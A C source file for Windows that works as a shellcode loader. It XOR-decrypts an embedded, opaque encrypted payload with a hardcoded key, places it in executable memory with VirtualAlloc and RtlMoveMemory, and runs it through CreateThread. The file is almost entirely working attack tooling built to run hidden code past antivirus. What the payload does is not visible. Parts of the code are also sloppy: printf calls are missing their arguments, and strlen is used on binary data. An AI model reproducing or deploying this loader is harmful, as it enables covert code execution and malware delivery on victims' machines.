#include <windows.h>
#include <stdio.h>
#include <string.h>
/*
1. Decrypt the encrypted shellcode with the key used to encrypt the shellcode.
2. Allocate a enough space on virtual memory for the decrypted shell code using VirtualAlloc()
3. Copy decrypted shellcode to the allocated memory using RtlMoveMemory()
4. Execute the certain region using CreateThread()

*/


int launch(char *buff)
{
    LPVOID lpvAddr;               // address of the test memory
    HANDLE  hHand;
    DWORD dwWaitResult;
    DWORD threadID;
    lpvAddr = VirtualAlloc(NULL, strlen(buff),0x3000,0x40);
    if(lpvAddr == NULL){
             printf("VirtualAlloc failed. Error");
             return 1;
    }else{
          printf("Committed %lu bytes at address");
    }
    RtlMoveMemory(lpvAddr,buff, strlen(buff));
    hHand = CreateThread(NULL,0,lpvAddr,NULL,0,&threadID);
    if(hHand == NULL){
             printf("CreateThread failed. Error");
             return 1;
    }
    else{
         printf("Createthread successful!");
    }
    dwWaitResult = WaitForSingleObject(hHand,INFINITE);
    return 0;
}
int main()
{
	char dec[1000]= {'\0'};
	int i = 0,key_count = 0;
	char key[] = "myxorkey@123";
	//XOR Encrypted Shell Code with key myxorkey@123
	char enc[] =  "\xD7\xF6\x5A\xAE\xA5\xB1\xAA\xA0\x34\x15\xC6\x68\x5C\xB0\xC9\x26\x43\x38"
                  "\x71\xFA\x83\x35\x31\x60\x7D\x14\xAF\x52\x4D\x93\x7D\xC7\x80\xAB\xA3\x68"
                  "\x9C\xF1\xBE\x47\xD2\x77\xE9\x04\x09\xE6\xF2\xA6\xB7\xEC\xB4\xF5\x19\x78"
                  "\x4E\xED\x2C\xA3\xC1\x49\xC3\xCC\xF7\xEF\x91\x7E\xD4\x33\xB6\x65\xC4\x84"
                  "\x94\x7D\xD7\xD3\xDA\xD3\xA1\xF8\x30\x88\x38\xBD\xA4\xB8\x57\x3E\xCF\x10"
                  "\x54\xFB\x2E\xC1\x4B\x09\x69\x27\x22\x54\xBB\xD6\xC3\x0B\x26\x44\x6E\xB6"
                  "\xC3\x3D\xE5\xD8\xFC\x61\xC5\x0E\x43\x62\xD6\x83\x91\x5F\x66\xAC\xF3\x5B"
                  "\x80\xC0\x1D\x84\xCA\x29\x78\x14\xA1\xF4\x88\x80\xCF\xE9\xF7\x49\xC6\x87"
                  "\x2B\xD4\xF6\xAE\xB1\x3B\x24\x39\xD7\x47\x77\x3B\x2E\x6E\xA4\x9B\x50\x43"
                  "\x5B\x29\xDA\xBD\x06\x40\xA2\xCF\x6E\x73\x4E\xEF\xCD\xA5\x6A\xAE\xE9\xDD"
                  "\x98\x72\x0C\x2C\x0F\xFE\xE6\xDD\x14\x50\x29\x68\x3A\xE8\x4D\xF7\x71\xAA"
                  "\x48\x70\x6C\xBB\x9F\x85\x94\x65\x86\x77\x20\xB7\xCB\xA1\x42\x85\x96\xE5"
                  "\x10\xDD\xBE\x53\x64\x25\x59\xAE\x99\x17\x09\x12\xDF\x4D\x3C\x53\x6C\xDA"
                  "\xC7\x2D\xCE\xA6\x4F\xF2\x5A\xCB\x8E\x1F\xC5\x02\x16\xCB\x73\xAC\xB1\x4E"
                  "\xD9\x91\xEF\x85\x46\xCC\xAF\xC4\x0B\x23\x52\x71\xB3\xE1\x5B\x7A\x04\xC9"
                  "\x77\x28\x99\x6C\x43\xDA\xBD\xB2\x42\xE9\x6E\x70\xDE\x2F\x0B\x40\x89\x0D"
                  "\x46\x58\x90\x34\x46\x97\xF9\x8E\xE1\xCF\xC6\x97\x0F\xEF\x82\xFC\x37\x52"
                  "\x61\x8F\x17\x37\xE1\x0C\xBF\x07\x29\x43\x6C\x6B";

	for (i = 0 ; i<= strlen(enc);i++){
		dec[i] = key[key_count]^enc[i];
		key_count++;
		if(key_count == strlen(key)){
			key_count = 0;
		}
	}
	launch(dec);
return 0;
}
